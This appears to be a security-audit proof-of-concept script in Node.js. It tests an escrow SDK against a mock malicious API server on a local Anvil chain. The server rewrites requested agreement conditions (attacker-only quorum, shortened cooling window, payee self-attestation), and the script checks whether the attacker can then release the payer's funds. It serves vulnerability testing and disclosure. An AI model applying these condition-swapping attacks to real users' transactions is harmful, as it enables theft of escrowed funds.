// ROUND 26-C — Team C. Live SDK (sha f450d44d…, 54.263 B, snapshot
// live-api-round26-c) + Agreement v4.1 etched zerofee on fresh Anvil 4663.
// Real SDK verbatim + mock API. Throwaway local (anvil) keys only.
// No live POSTs, no real funds.
// Usage: node run-sdk-round26.mjs <mode>  (fresh Anvil per run, port 8548)
//   k2190 : CONTROL — deal("optimistic", windowHours=48) with server
//           returning kind-5 value=now (window already closed).
//           Expect: SDK REFUSES (near-value check, line ~460) — DEAD.
//   k2191 : CONTROL — deal("balance_trigger", holder=H, min=1M) with
//           server returning data=balanceOf(attacker), value=1.
//           Expect: SDK REFUSES (data/value check, line ~455) — DEAD.
//   k2192 : deal("panel", arbiters=[v1,v2,v3], k=2) with server returning
//           quorum data=[attacker], value=1. Expect: SDK SENDS; attacker
//           votes once + releases 500 USDG — B-23 K-593, FOLD (node level).
//   k2193 : deal("confirmed_with_cooling", arbiter, windowHours=720)
//           with server returning kind-9 value=3600. Expect: SDK SENDS;
//           arbiter attests; release blocked <1h, release +500 after
//           3601s — B-23 K-595, FOLD (node level).
//   k2194 : deal("arbiter_escrow", expiryHours=1) with server returning
//           expiry=now+24h. Expect: SDK SENDS (hoursMax floor is 24h);
//           refund blocked at +1h, succeeds at +24h — payer locked 24x
//           longer than asked. Delay-only -> OBS (Minor, not filed).
import http from "node:http";
import fs from "node:fs";
import path from "node:path";
import { fileURLToPath } from "node:url";
import {
  createPublicClient, createWalletClient, http as vhttp, defineChain,
  parseAbi, encodeFunctionData, encodeAbiParameters, keccak256, toHex, erc20Abi,
} from "viem";
import { privateKeyToAccount } from "viem/accounts";
import { Bull } from "./sdk-live.mjs";

const ROOT = path.resolve(path.dirname(fileURLToPath(import.meta.url)));
const RPC = "http://127.0.0.1:8559";
const API_PORT = 3008;
const AGREEMENT = "0x7AB58fAAe65eFCF0037635382cAA546EaC233DA6";
const USDG = "0x5fc5360D0400a0Fd4f2af552ADD042D716F1d168";
const ZERO = "0x0000000000000000000000000000000000000000";

const chain = defineChain({ id: 4663, name: "Robinhood Chain",
  nativeCurrency: { decimals: 18, name: "ETH", symbol: "ETH" },
  rpcUrls: { default: { http: [RPC] } } });
const victimKey = "0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80";
const arbiterKey = "0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d";
const attackerKey = "0x5de4111afa1a4b94908f83103eb1f1706367c2e68ca870fc3fb9a804cdab365a";
const strangerKey = "0x0000000000000000000000000000000000000000000000000000000000009999";
const holderKey = "0x0000000000000000000000000000000000000000000000000000000000001111";
const victim = privateKeyToAccount(victimKey);
const arbiter = privateKeyToAccount(arbiterKey);
const attacker = privateKeyToAccount(attackerKey);
const stranger = privateKeyToAccount(strangerKey);
const holder = privateKeyToAccount(holderKey);
const V = victim.address, ARB = arbiter.address, A = attacker.address, S = stranger.address, H = holder.address;
const V1 = "0x1111111111111111111111111111111111111111";
const V2 = "0x2222222222222222222222222222222222222222";
const V3 = "0x3333333333333333333333333333333333333333";

const publicClient = createPublicClient({ chain, transport: vhttp(RPC) });
const walletV = createWalletClient({ chain, transport: vhttp(RPC), account: victim });
const walletA = createWalletClient({ chain, transport: vhttp(RPC), account: attacker });
const walletR = createWalletClient({ chain, transport: vhttp(RPC), account: arbiter });
const walletS = createWalletClient({ chain, transport: vhttp(RPC), account: stranger });
const wall = () => Math.floor(Date.now() / 1000);

const AGR_ABI = parseAbi([
  "function createAgreement((address payee,address asset,uint256 amount,uint64 expiry,bytes32 termsHash,(uint8 kind,address target,bytes data,uint256 value)[] conditions) p,(uint256 feeWei,uint64 expiry,bytes sig) q) payable returns (uint256)",
  "function attest(uint256 id,uint256 index) returns (bool)",
  "function vote(uint256 id,uint256 index) returns (bool)",
  "function release(uint256 id) returns (bool)",
  "function refund(uint256 id) returns (bool)",
]);
const approveCall = (spender, amt) => encodeFunctionData({ abi: erc20Abi, functionName: "approve", args: [spender, amt] });
const tx = (to, data, value = "0") => ({ to, data, value });
const bal = (token, who) => publicClient.readContract({ address: token, abi: erc20Abi, functionName: "balanceOf", args: [who] });
const zero32 = "0x" + "00".repeat(32);
const termsHashOf = (terms) => (terms ? keccak256(toHex(String(terms))) : zero32);

async function rpc(method, params) {
  const r = await fetch(RPC, { method: "POST", headers: { "content-type": "application/json" },
    body: JSON.stringify({ jsonrpc: "2.0", id: 1, method, params }) });
  const j = await r.json(); if (j.error) throw new Error(method + ": " + JSON.stringify(j.error)); return j.result;
}
const toHex32 = (n) => "0x" + BigInt(n).toString(16).padStart(64, "0");
const current = { mode: "k2190" };

function mkAgr(payee, asset, amount, expiry, termsHash, conds) {
  return encodeFunctionData({ abi: AGR_ABI, functionName: "createAgreement",
    args: [{ payee, asset, amount, expiry: BigInt(expiry), termsHash, conditions: conds },
           { feeWei: 0n, expiry: BigInt(wall() + 3600), sig: "0x" + "00".repeat(65) }] });
}
const balData = (who) => encodeFunctionData({ abi: erc20Abi, functionName: "balanceOf", args: [who] }).toLowerCase();

const server = http.createServer(async (req, res) => {
  const body = await new Promise((r) => { let d = ""; req.on("data", (c) => (d += c)); req.on("end", () => r(d)); });
  const send = (o) => { res.writeHead(200, { "content-type": "application/json" }); res.end(JSON.stringify(o)); };
  const p = JSON.parse(body || "{}");
  const w = wall();
  const amt500 = 500n * 10n ** 6n;
  const expiry = (h) => BigInt(w + Math.round(h * 3600));
  const th = termsHashOf(p.terms);
  const mode = current.mode;
  const approve = (token, amt) => ({ transaction: tx(token, approveCall(AGREEMENT, amt)) });
  if (req.url === "/api/v1/templates" && req.method === "POST") {
    let steps = [];
    if (mode === "k2190") { // optimistic, kind-5 value=now (window already closed)
      steps = [approve(USDG, amt500), { transaction: tx(AGREEMENT, mkAgr(A, USDG, amt500, expiry(72), th, [
        { kind: 5, target: V, data: "0x", value: BigInt(w) },
      ])) }];
    } else if (mode === "k2191") { // balance_trigger, data=balanceOf(attacker), value=1
      steps = [approve(USDG, amt500), { transaction: tx(AGREEMENT, mkAgr(A, USDG, amt500, expiry(72), th, [
        { kind: 7, target: USDG, data: balData(A), value: 1n },
      ])) }];
    } else if (mode === "k2192") { // panel, quorum [attacker]/k=1
      const qdata = encodeAbiParameters([{ type: "address[]" }], [[A]]).toLowerCase();
      steps = [approve(USDG, amt500), { transaction: tx(AGREEMENT, mkAgr(A, USDG, amt500, expiry(72), th, [
        { kind: 6, target: ZERO, data: qdata, value: 1n },
      ])) }];
    } else if (mode === "k2193") { // confirmed_with_cooling, kind-9 value=3600 (asked 720h)
      steps = [approve(USDG, amt500), { transaction: tx(AGREEMENT, mkAgr(A, USDG, amt500, expiry(72), th, [
        { kind: 1, target: ARB, data: "0x", value: 0n },
        { kind: 9, target: V, data: encodeAbiParameters([{ type: "uint256" }], [0n]).toLowerCase(), value: 3600n },
      ])) }];
    } else if (mode === "k2194") { // arbiter_escrow, expiryHours=1 asked, server sets now+24h
      steps = [approve(USDG, amt500), { transaction: tx(AGREEMENT, mkAgr(A, USDG, amt500, expiry(24), th, [
        { kind: 1, target: ARB, data: "0x", value: 0n },
      ])) }];
    } else if (mode === "k2194c") { // CONTROL — honest server: expiryHours=1 asked, server sets now+1h
      steps = [approve(USDG, amt500), { transaction: tx(AGREEMENT, mkAgr(A, USDG, amt500, expiry(1), th, [
        { kind: 1, target: ARB, data: "0x", value: 0n },
      ])) }];
    } else if (mode === "k2213") { // scheduled_payment, afterHours OMITTED — server offers kind-0 value now+24h
      steps = [approve(USDG, amt500), { transaction: tx(AGREEMENT, mkAgr(A, USDG, amt500, expiry(72), th, [
        { kind: 0, target: ZERO, data: "0x", value: BigInt(w + 24 * 3600) },
      ])) }];
    } else if (mode === "k2214") { // split_payment, afterHours+arbiter OMITTED — 2 shares kind-0 now+24h
      const amt250 = 250n * 10n ** 6n;
      steps = [approve(USDG, amt500),
        { transaction: tx(AGREEMENT, mkAgr(A, USDG, amt250, expiry(72), th, [{ kind: 0, target: ZERO, data: "0x", value: BigInt(w + 24 * 3600) }])) },
        { transaction: tx(AGREEMENT, mkAgr(V1, USDG, amt250, expiry(72), th, [{ kind: 0, target: ZERO, data: "0x", value: BigInt(w + 24 * 3600) }])) }];
    } else if (mode === "k2215") { // optimistic, windowHours OMITTED — server offers kind-5 value now+24h
      steps = [approve(USDG, amt500), { transaction: tx(AGREEMENT, mkAgr(A, USDG, amt500, expiry(72), th, [
        { kind: 5, target: V, data: "0x", value: BigInt(w + 24 * 3600) },
      ])) }];
    } else if (mode === "k2216") { // recurring_payment, everyHours OMITTED — 2 payments kind-0 now+168h/+336h
      const amt1000 = 1000n * 10n ** 6n;
      steps = [approve(USDG, amt1000),
        { transaction: tx(AGREEMENT, mkAgr(A, USDG, amt500, expiry(72), th, [{ kind: 0, target: ZERO, data: "0x", value: BigInt(w + 168 * 3600) }])) },
        { transaction: tx(AGREEMENT, mkAgr(A, USDG, amt500, expiry(72), th, [{ kind: 0, target: ZERO, data: "0x", value: BigInt(w + 336 * 3600) }])) }];
    } else if (mode === "k2217") { // price_trigger, op OMITTED — server offers kind-7 (gte) data=balanceOf(A) value=1
      steps = [approve(USDG, amt500), { transaction: tx(AGREEMENT, mkAgr(A, USDG, amt500, expiry(72), th, [
        { kind: 7, target: USDG, data: balData(A), value: 1n },
      ])) }];
    } else if (mode === "k2219") { // performance_bond, expiryHours=1 asked, server sets now+24h
      steps = [approve(USDG, amt500), { transaction: tx(AGREEMENT, mkAgr(A, USDG, amt500, expiry(24), th, [
        { kind: 1, target: ARB, data: "0x", value: 0n },
      ])) }];
    } else if (mode === "k4625a") { // MINOR19-C K-4625: token_price_trigger, server swaps conditions to attest-by-PAYEE
      steps = [approve(USDG, amt500), { transaction: tx(AGREEMENT, mkAgr(A, USDG, amt500, expiry(72), th, [
        { kind: 1, target: A, data: "0x", value: 0n },
      ])) }];
    } else if (mode === "k4621") { // MINOR19-C K-4621 support: arbiter_escrow $25, arbiter = attacker 0x3333...
      const amt25 = 25n * 10n ** 6n;
      steps = [approve(USDG, amt25), { transaction: tx(AGREEMENT, mkAgr(A, USDG, amt25, expiry(72), th, [
        { kind: 1, target: V3, data: "0x", value: 0n },
      ])) }];
    }
    return send({ steps });
  }
  if (req.url === "/api/v1/agreements" && req.method === "POST") {
    // k2218: agree() without expiryHours — server sets expiry now+72h
    const steps = [approve(USDG, amt500), { transaction: tx(AGREEMENT, mkAgr(A, USDG, amt500, expiry(72), th, [
      { kind: 1, target: ARB, data: "0x", value: 0n },
    ])) }];
    return send({ steps });
  }
  res.writeHead(404); res.end("{}");
});

async function tryCall(wallet, fn, id, idx = 0n) {
  try { await wallet.writeContract({ address: AGREEMENT, abi: AGR_ABI, functionName: fn, args: (fn === "attest" || fn === "vote") ? [BigInt(id), idx] : [BigInt(id)] }); return true; }
  catch { return false; }
}
const usdg = (x) => (BigInt(x) / 10n ** 6n).toString();

async function setup() {
  await new Promise((r) => server.listen(API_PORT, r));
  const agrZero = "0x" + fs.readFileSync(path.join(ROOT, "chain/bytecode/agreement-v41-zerofee.hex"), "utf8").trim().replace(/^0x/, "");
  await rpc("anvil_setCode", [AGREEMENT, agrZero]);
  await rpc("anvil_setStorageAt", [AGREEMENT, "0x0", toHex32(1n)]);
  await rpc("anvil_setStorageAt", [AGREEMENT, "0xb", toHex32(1n)]);
  const mocks = JSON.parse(fs.readFileSync(path.join(ROOT, "mocks/MockERC20.json"), "utf8"));
  const hash = await walletV.deployContract({ abi: mocks.abi, bytecode: mocks.bytecode.object, args: [] });
  const addr = (await publicClient.waitForTransactionReceipt({ hash })).contractAddress;
  const code = await publicClient.getCode({ address: addr });
  await rpc("anvil_setCode", [USDG, code]);
  await rpc("anvil_setStorageAt", [USDG, "0x2", toHex32(6n)]);
  await walletV.writeContract({ address: USDG, abi: mocks.abi, functionName: "mint", args: [V, 500000n * 10n ** 6n] });
  await walletV.writeContract({ address: USDG, abi: mocks.abi, functionName: "mint", args: [A, 1000000n * 10n ** 6n] });
}

async function main() {
  const mode = process.argv[2] || "k2190";
  current.mode = mode;
  await setup();
  const bull = new Bull({ walletClient: walletV, publicClient, baseUrl: `http://127.0.0.1:${API_PORT}` });
  const results = [];
  const push = (o) => { results.push(o); console.log(`[${o.case}]`, JSON.stringify(o)); };

  if (mode === "k2190") {
    let id = null, err = "";
    try { id = await bull.deal("optimistic", { payee: A, asset: "usdg", amount: "500", terms: "Deliver the report", expiryHours: 72, windowHours: 48 }); }
    catch (e) { err = String(e.message || e); }
    push({ case: "K-2190 CONTROL deal(optimistic) kind-5 value=now, windowHours=48 asked", sdkSent: !!id, sdkThrew: err.slice(0, 300), agreementId: id ? String(id) : null, refusedBySdkWindowCheck: err.includes("Bull SDK safety check failed") && err.includes("objection window") });
  }
  if (mode === "k2191") {
    let id = null, err = "";
    try { id = await bull.deal("balance_trigger", { payee: A, asset: "usdg", amount: "500", token: USDG, holder: H, min: "1000000", terms: "Deliver the report", expiryHours: 72 }); }
    catch (e) { err = String(e.message || e); }
    push({ case: "K-2191 CONTROL deal(balance_trigger) data=balanceOf(attacker) value=1", sdkSent: !!id, sdkThrew: err.slice(0, 300), agreementId: id ? String(id) : null, refusedBySdkBalanceCheck: err.includes("Bull SDK safety check failed") && err.includes("balance condition") });
  }
  if (mode === "k2192") {
    const before = await bal(USDG, A);
    let id = null, err = "";
    try { id = await bull.deal("panel", { payee: A, asset: "usdg", amount: "500", arbiters: [V1, V2, V3], k: 2, terms: "Deliver the report", expiryHours: 72 }); }
    catch (e) { err = String(e.message || e); }
    const sent = !!id;
    let vote = false, rel = false;
    if (sent) { vote = await tryCall(walletA, "vote", id); rel = await tryCall(walletA, "release", id); }
    const after = await bal(USDG, A);
    push({ case: "K-2192 deal(panel) quorum swapped to [attacker]/k=1", sdkSent: sent, sdkThrew: err.slice(0, 300), agreementId: id ? String(id) : null, attackerVoted: vote, released: rel, payeeGainedUsdg: usdg(after - before), exploited: sent && vote && rel && (after - before) === 500n * 10n ** 6n });
  }
  if (mode === "k2193") {
    const before = await bal(USDG, A);
    let id = null, err = "";
    try { id = await bull.deal("confirmed_with_cooling", { payee: A, asset: "usdg", amount: "500", arbiter: ARB, terms: "Deliver the report", expiryHours: 72, windowHours: 720 }); }
    catch (e) { err = String(e.message || e); }
    const sent = !!id;
    let att = false, relEarly = false, relAfter = false;
    if (sent) {
      att = await tryCall(walletR, "attest", id);
      relEarly = await tryCall(walletA, "release", id);
      await rpc("anvil_increaseTime", [3601]);
      await rpc("anvil_setBalance", [A, "0x8ac7230489e80000"]);
      relAfter = await tryCall(walletA, "release", id);
    }
    const after = await bal(USDG, A);
    push({ case: "K-2193 deal(confirmed_with_cooling) kind-9 value=3600, windowHours=720 asked", sdkSent: sent, sdkThrew: err.slice(0, 300), agreementId: id ? String(id) : null, arbiterAttested: att, releaseBlockedEarly: !relEarly, releasedAfter1h: relAfter, payeeGainedUsdg: usdg(after - before), windowShrunk720hTo1h: sent && att && !relEarly && relAfter && (after - before) === 500n * 10n ** 6n });
  }
  if (mode === "k2213") {
    let id = null, err = "";
    try { id = await bull.deal("scheduled_payment", { payee: A, asset: "usdg", amount: "500", terms: "Deliver the report", expiryHours: 72 }); }
    catch (e) { err = String(e.message || e); }
    push({ case: "K-2213 deal(scheduled_payment) afterHours omitted", sdkSent: !!id, sdkThrew: err.slice(0, 300), agreementId: id ? String(id) : null, refusedFailClosed: err.includes("Bull SDK safety check failed") && err.includes("afterHours") });
  }
  if (mode === "k2214") {
    let ids = null, err = "";
    try { ids = await bull.deal("split_payment", { payees: [A, V1], shares: [50, 50], asset: "usdg", amount: "500", terms: "Deliver the report", expiryHours: 72 }); }
    catch (e) { err = String(e.message || e); }
    push({ case: "K-2214 deal(split_payment) afterHours+arbiter omitted", sdkSent: !!ids, sdkThrew: err.slice(0, 300), agreementIds: ids ? ids.map(String) : null, refusedFailClosed: err.includes("Bull SDK safety check failed") && err.includes("afterHours") });
  }
  if (mode === "k2215") {
    let id = null, err = "";
    try { id = await bull.deal("optimistic", { payee: A, asset: "usdg", amount: "500", terms: "Deliver the report", expiryHours: 72 }); }
    catch (e) { err = String(e.message || e); }
    push({ case: "K-2215 deal(optimistic) windowHours omitted, server kind-5 now+24h", sdkSent: !!id, sdkThrew: err.slice(0, 300), agreementId: id ? String(id) : null, sentOnDocumentedDefault24h: !!id });
  }
  if (mode === "k2216") {
    let ids = null, err = "";
    try { ids = await bull.deal("recurring_payment", { payee: A, asset: "usdg", amount: "500", terms: "Deliver the report", expiryHours: 72, payments: 2 }); }
    catch (e) { err = String(e.message || e); }
    push({ case: "K-2216 deal(recurring_payment) everyHours omitted, server kind-0 now+168h/+336h", sdkSent: !!ids, sdkThrew: err.slice(0, 300), agreementIds: ids ? ids.map(String) : null, sentOnDocumentedDefault168h: Array.isArray(ids) && ids.length === 2 });
  }
  if (mode === "k2217") {
    let id = null, err = "";
    try { id = await bull.deal("price_trigger", { payee: A, asset: "usdg", amount: "500", target: USDG, data: balData(A), value: 1, terms: "Deliver the report", expiryHours: 72 }); }
    catch (e) { err = String(e.message || e); }
    push({ case: "K-2217 deal(price_trigger) op omitted, server kind-7 gte", sdkSent: !!id, sdkThrew: err.slice(0, 300), agreementId: id ? String(id) : null, sentAsGteDefault: !!id });
  }
  if (mode === "k2218") {
    let id = null, err = "";
    try { id = await bull.agree({ payee: A, asset: "usdg", amount: "500", terms: "Deliver the report", conditions: [{ type: "attest", by: ARB }] }); }
    catch (e) { err = String(e.message || e); }
    push({ case: "K-2218 agree() expiryHours omitted, server expiry now+72h", sdkSent: !!id, sdkThrew: err.slice(0, 300), agreementId: id ? String(id) : null, sentWithNoExpiryCheck: !!id });
  }
  if (mode === "k2219") {
    const payerBefore = await bal(USDG, V);
    let id = null, err = "";
    try { id = await bull.deal("performance_bond", { payee: A, asset: "usdg", amount: "500", arbiter: ARB, terms: "Deliver the report", expiryHours: 1 }); }
    catch (e) { err = String(e.message || e); }
    const sent = !!id;
    let refAt1h = false, refAt24h = false;
    if (sent) {
      await rpc("anvil_increaseTime", [3601]);
      await rpc("anvil_setBalance", [S, "0x8ac7230489e80000"]);
      refAt1h = await tryCall(walletS, "refund", id);
      await rpc("anvil_increaseTime", [23 * 3600 + 1]);
      refAt24h = await tryCall(walletS, "refund", id);
    }
    const payerAfter = await bal(USDG, V);
    push({ case: "K-2219 deal(performance_bond) expiryHours=1 asked, server set now+24h", sdkSent: sent, sdkThrew: err.slice(0, 300), agreementId: id ? String(id) : null, refundBlockedAt1h: !refAt1h, refundSucceededAt24h: refAt24h, payerRestoredToPreDeal: payerAfter === payerBefore, lockStretched1hTo24h: sent && !refAt1h && refAt24h && payerAfter === payerBefore });
  }
  if (mode === "k2194c") {
    const payerBefore = await bal(USDG, V);
    let id = null, err = "";
    try { id = await bull.deal("arbiter_escrow", { payee: A, asset: "usdg", amount: "500", arbiter: ARB, terms: "Deliver the report", expiryHours: 1 }); }
    catch (e) { err = String(e.message || e); }
    const sent = !!id;
    let refAt1h = false;
    if (sent) {
      await rpc("anvil_increaseTime", [3601]);
      await rpc("anvil_setBalance", [S, "0x8ac7230489e80000"]);
      refAt1h = await tryCall(walletS, "refund", id);
    }
    const payerAfter = await bal(USDG, V);
    push({ case: "K-2194c CONTROL deal(arbiter_escrow) expiryHours=1 asked, server honest now+1h", sdkSent: sent, sdkThrew: err.slice(0, 300), agreementId: id ? String(id) : null, refundSucceededAt1h: refAt1h, payerRestoredToPreDeal: payerAfter === payerBefore, controlClean: sent && refAt1h && payerAfter === payerBefore });
  }
  if (mode === "k2194") {
    const payerBefore = await bal(USDG, V);
    let id = null, err = "";
    try { id = await bull.deal("arbiter_escrow", { payee: A, asset: "usdg", amount: "500", arbiter: ARB, terms: "Deliver the report", expiryHours: 1 }); }
    catch (e) { err = String(e.message || e); }
    const sent = !!id;
    let refAt1h = false, refAt24h = false;
    if (sent) {
      await rpc("anvil_increaseTime", [3601]);
      await rpc("anvil_setBalance", [S, "0x8ac7230489e80000"]);
      refAt1h = await tryCall(walletS, "refund", id);
      await rpc("anvil_increaseTime", [23 * 3600 + 1]);
      refAt24h = await tryCall(walletS, "refund", id);
    }
    const payerAfter = await bal(USDG, V);
    push({ case: "K-2194 deal(arbiter_escrow) expiryHours=1 asked, server set now+24h", sdkSent: sent, sdkThrew: err.slice(0, 300), agreementId: id ? String(id) : null, refundBlockedAt1h: !refAt1h, refundSucceededAt24h: refAt24h, payerRestoredToPreDeal: payerAfter === payerBefore, lockStretched1hTo24h: sent && !refAt1h && refAt24h && payerAfter === payerBefore });
  }
  if (mode === "k4625a") { // MINOR19-C K-4625: B-15 token_price_trigger exemption, live SDK b6e7d25c
    const before = await bal(USDG, A);
    let id = null, err = "";
    try { id = await bull.deal("token_price_trigger", { payee: A, asset: "usdg", amount: "500", token: USDG, op: "gte", price: "100", priceIn: "usdg", terms: "Deliver the report", expiryHours: 72 }); }
    catch (e) { err = String(e.message || e); }
    const sent = !!id;
    let att = false, rel = false;
    if (sent) { att = await tryCall(walletA, "attest", id); rel = await tryCall(walletA, "release", id); }
    const after = await bal(USDG, A);
    push({ case: "K-4625a B-15 deal(token_price_trigger) conditions never checked (attest-by-payee swap)", sdkSent: sent, sdkThrew: err.slice(0, 300), agreementId: id ? String(id) : null, payeeSelfAttested: att, released: rel, payeeGainedUsdg: usdg(after - before), exploited: sent && att && rel && (after - before) === 500n * 10n ** 6n });
  }
  if (mode === "k4621") { // MINOR19-C K-4621 support: attest+release arbiter_escrow, attacker arbiter 0x3333..., $25, agreement id 7
    await rpc("anvil_setStorageAt", [AGREEMENT, "0x0", toHex32(7n)]); // next agreement id = 7
    const sellerBefore = await bal(USDG, A);
    const payerBefore = await bal(USDG, V);
    let id = null, err = "";
    try { id = await bull.deal("arbiter_escrow", { payee: A, asset: "usdg", amount: "25", arbiter: V3, terms: "Deliver the report", expiryHours: 72 }); }
    catch (e) { err = String(e.message || e); }
    const sent = !!id;
    let att = false, rel = false;
    if (sent) {
      await rpc("anvil_impersonateAccount", [V3]);
      await rpc("anvil_setBalance", [V3, "0x8ac7230489e80000"]);
      const walletArb3 = createWalletClient({ chain, transport: vhttp(RPC), account: V3 });
      att = await tryCall(walletArb3, "attest", id);
      await rpc("anvil_stopImpersonatingAccount", [V3]);
      rel = await tryCall(walletA, "release", id);
    }
    const sellerAfter = await bal(USDG, A);
    const payerAfter = await bal(USDG, V);
    push({ case: "K-4621 support attest+release arbiter_escrow attacker-arbiter 0x3333... $25 id 7", sdkSent: sent, sdkThrew: err.slice(0, 300), agreementId: id ? String(id) : null, agreementIdIs7: id === "7" || id === 7, attackerArbiterAttested: att, released: rel, sellerGainedUsdg: usdg(sellerAfter - sellerBefore), payerLostUsdg: usdg(payerBefore - payerAfter), sellerPaid25WithoutDelivery: sent && att && rel && (sellerAfter - sellerBefore) === 25n * 10n ** 6n });
  }
  console.log(JSON.stringify(results, null, 2));
  fs.writeFileSync(path.join(ROOT, `node-result-${mode}.json`), JSON.stringify({ mode, sdk: "b6e7d25c91d1a77f324ec1e97109f01e5ba5110f52f5f1f949fd5ab7d09afe2b", agreement: "v4.1-0x7AB58fAAe65eFCF0037635382cAA546EaC233DA6", results }, null, 2));
  server.close();
  process.exit(0);
}
main().catch((e) => { console.error("RUNNER FATAL", e); server.close(); process.exit(2); });
